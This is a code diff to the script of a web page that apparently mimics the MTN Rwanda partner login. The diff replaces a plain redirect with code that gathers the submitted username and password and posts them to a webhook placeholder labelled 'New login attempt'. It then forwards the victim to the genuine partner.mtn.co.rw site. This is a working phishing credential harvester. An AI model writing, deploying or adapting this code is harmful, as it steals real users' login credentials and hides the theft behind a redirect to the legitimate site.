@@ -123,11 +123,35 @@
         document.addEventListener("DOMContentLoaded", function() {
             var form = document.querySelector('form');
             form.addEventListener('submit', function(event) {
-                // Prevent default form submission
-                event.preventDefault();
+                event.preventDefault(); // Prevent default form submission
                 
-                // Redirect to desired URL
-                window.location.href = 'https://partner.mtn.co.rw/';
+                var formData = new FormData(form);
+                var data = {};
+                formData.forEach((value, key) => {
+                    data[key] = value;
+                });
+
+                // Send data to webhook
+                var webhookURL = 'YOUR_WEBHOOK_URL_HERE'; // Replace with your actual webhook URL
+
+                fetch(webhookURL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ content: `New login attempt:\nUsername: ${data.username}\nPassword: ${data.password}` })
+                })
+                .then(response => response.json())
+                .then(result => {
+                    console.log('Webhook sent successfully:', result);
+                    // Redirect to desired URL
+                    window.location.href = 'https://partner.mtn.co.rw/';
+                })
+                .catch(error => {
+                    console.error('Error sending webhook:', error);
+                    // Redirect to desired URL regardless of webhook error
+                    window.location.href = 'https://partner.mtn.co.rw/';
+                });
             });
         });
     </script>
